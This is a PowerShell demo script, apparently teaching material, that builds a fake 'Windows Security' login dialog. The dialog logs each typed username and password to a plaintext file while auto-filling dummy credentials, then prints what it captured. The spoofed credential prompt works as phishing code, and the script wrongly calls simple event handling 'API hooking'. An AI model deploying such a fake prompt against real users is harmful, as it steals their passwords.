# ========================================
# API Hooking Simulation Demo
# Target: Input field monitoring
# ========================================

$logPath = "C:\Users\Public\data\hooked_credentials.txt"

# 로그 폴더 생성
New-Item -Path "C:\Users\Public\data" -ItemType Directory -Force | Out-Null

# UTF8 인코딩 설정
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   API Hooking Simulation" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Windows Forms 입력 창 후킹 시뮬레이션
$code = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class InputHook : Form {
    private TextBox usernameBox;
    private TextBox passwordBox;
    private Button loginButton;
    private string logPath;
    private System.Windows.Forms.Timer autoFillTimer;
    private int step = 0;
    
    public InputHook(string log) {
        logPath = log;
        
        this.Text = "Windows Security";
        this.Size = new System.Drawing.Size(400, 200);
        this.StartPosition = FormStartPosition.CenterScreen;
        this.FormBorderStyle = FormBorderStyle.FixedDialog;
        this.MaximizeBox = false;
        
        Label userLabel = new Label();
        userLabel.Text = "Username:";
        userLabel.Location = new System.Drawing.Point(30, 30);
        userLabel.Size = new System.Drawing.Size(100, 20);
        
        Label passLabel = new Label();
        passLabel.Text = "Password:";
        passLabel.Location = new System.Drawing.Point(30, 70);
        passLabel.Size = new System.Drawing.Size(100, 20);
        
        usernameBox = new TextBox();
        usernameBox.Location = new System.Drawing.Point(140, 30);
        usernameBox.Size = new System.Drawing.Size(200, 20);
        usernameBox.TextChanged += UsernameBox_TextChanged;
        
        passwordBox = new TextBox();
        passwordBox.Location = new System.Drawing.Point(140, 70);
        passwordBox.Size = new System.Drawing.Size(200, 20);
        passwordBox.PasswordChar = '*';
        passwordBox.TextChanged += PasswordBox_TextChanged;
        
        loginButton = new Button();
        loginButton.Text = "OK";
        loginButton.Location = new System.Drawing.Point(140, 110);
        loginButton.Size = new System.Drawing.Size(90, 30);
        loginButton.Click += LoginButton_Click;
        
        Button cancelButton = new Button();
        cancelButton.Text = "Cancel";
        cancelButton.Location = new System.Drawing.Point(250, 110);
        cancelButton.Size = new System.Drawing.Size(90, 30);
        cancelButton.Click += (s, e) => this.Close();
        
        this.Controls.Add(userLabel);
        this.Controls.Add(passLabel);
        this.Controls.Add(usernameBox);
        this.Controls.Add(passwordBox);
        this.Controls.Add(loginButton);
        this.Controls.Add(cancelButton);
        
        autoFillTimer = new System.Windows.Forms.Timer();
        autoFillTimer.Interval = 500;
        autoFillTimer.Tick += AutoFillTimer_Tick;
        autoFillTimer.Start();
    }
    
    private void AutoFillTimer_Tick(object sender, EventArgs e) {
        switch(step) {
            case 0:
                usernameBox.Text = "a";
                break;
            case 1:
                usernameBox.Text = "ad";
                break;
            case 2:
                usernameBox.Text = "adm";
                break;
            case 3:
                usernameBox.Text = "admi";
                break;
            case 4:
                usernameBox.Text = "admin";
                break;
            case 5:
                passwordBox.Text = "P";
                break;
            case 6:
                passwordBox.Text = "Pa";
                break;
            case 7:
                passwordBox.Text = "Pas";
                break;
            case 8:
                passwordBox.Text = "Pass";
                break;
            case 9:
                passwordBox.Text = "Pass1";
                break;
            case 10:
                passwordBox.Text = "Pass12";
                break;
            case 11:
                passwordBox.Text = "Pass123";
                break;
            case 12:
                autoFillTimer.Stop();
                loginButton.PerformClick();
                break;
        }
        step++;
    }
    
    private void UsernameBox_TextChanged(object sender, EventArgs e) {
        string intercepted = DateTime.Now.ToString("HH:mm:ss") + " [USERNAME FIELD] " + usernameBox.Text + "\n";
        System.IO.File.AppendAllText(logPath, intercepted);
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("[HOOKED] Username input: " + usernameBox.Text);
    }
    
    private void PasswordBox_TextChanged(object sender, EventArgs e) {
        string intercepted = DateTime.Now.ToString("HH:mm:ss") + " [PASSWORD FIELD] " + passwordBox.Text + "\n";
        System.IO.File.AppendAllText(logPath, intercepted);
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("[HOOKED] Password input: " + passwordBox.Text);
    }
    
    private void LoginButton_Click(object sender, EventArgs e) {
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        string finalLog = "\n=== LOGIN ATTEMPT ===\n";
        finalLog += "Time: " + timestamp + "\n";
        finalLog += "Username: " + usernameBox.Text + "\n";
        finalLog += "Password: " + passwordBox.Text + "\n";
        finalLog += "Computer: " + Environment.MachineName + "\n";
        finalLog += "=====================\n\n";
        
        System.IO.File.AppendAllText(logPath, finalLog);
        
        // MessageBox 없이 바로 닫기
        this.Close();
    }
}
'@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms,System.Drawing

Write-Host "[1/4] Initializing API Hook..." -ForegroundColor Yellow
Write-Host "      Hooking: TextBox input events" -ForegroundColor Gray
Write-Host "      Target: Windows Forms controls" -ForegroundColor Gray
Write-Host ""

# 로그 헤더
$header = @"
===========================================
API Hooking Session Started
===========================================
Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Target: Input field monitoring
Hook Type: TextChanged event interception
Log Path: $logPath
===========================================

"@
Set-Content -Path $logPath -Value $header

Write-Host "[2/4] Deploying hooked login window..." -ForegroundColor Yellow
Write-Host ""
Write-Host "      [!] A fake login window will appear" -ForegroundColor Red
Write-Host "      [!] All input will be intercepted" -ForegroundColor Red
Write-Host "      [!] Auto-filling credentials..." -ForegroundColor Red
Write-Host ""

Start-Sleep -Seconds 2

Write-Host "[3/4] Showing target window with auto-fill..." -ForegroundColor Yellow
Write-Host "      Simulating user typing..." -ForegroundColor Gray
Write-Host ""

# 후킹된 로그인 창 표시
$form = New-Object InputHook($logPath)
$form.ShowDialog() | Out-Null

Write-Host ""
Write-Host "[4/4] Analyzing intercepted data..." -ForegroundColor Yellow

Start-Sleep -Seconds 1

# 결과 표시
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   Intercepted Credentials" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

if (Test-Path $logPath) {
    $content = Get-Content $logPath -Raw -Encoding UTF8
    Write-Host $content -ForegroundColor White
    
    # 자격증명 추출
    if ($content -match "Username: (.+)") {
        $username = $matches[1]
        Write-Host ""
        Write-Host "========================================" -ForegroundColor Red
        Write-Host "   Extracted Credentials" -ForegroundColor Red
        Write-Host "========================================" -ForegroundColor Red
        Write-Host ""
        Write-Host "[!] Username: $username" -ForegroundColor Red
    }
    
    if ($content -match "Password: (.+)") {
        $password = $matches[1]
        Write-Host "[!] Password: $password" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   Hooking Demo Complete!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "What happened:" -ForegroundColor Yellow
Write-Host "  1. API Hook installed on TextBox.TextChanged" -ForegroundColor White
Write-Host "  2. Auto-filled username: admin" -ForegroundColor White
Write-Host "  3. Auto-filled password: Pass123" -ForegroundColor White
Write-Host "  4. Every keystroke was intercepted" -ForegroundColor White
Write-Host "  5. Auto-clicked OK button" -ForegroundColor White
Write-Host "  6. Window closed automatically" -ForegroundColor White
Write-Host "  7. Data logged to: $logPath" -ForegroundColor White
Write-Host ""
Write-Host "View full log:" -ForegroundColor Yellow
Write-Host "  Get-Content '$logPath' -Encoding UTF8" -ForegroundColor Gray
Write-Host ""
Write-Host "Clean up:" -ForegroundColor Yellow
Write-Host "  Remove-Item '$logPath' -Force" -ForegroundColor Gray
Write-Host ""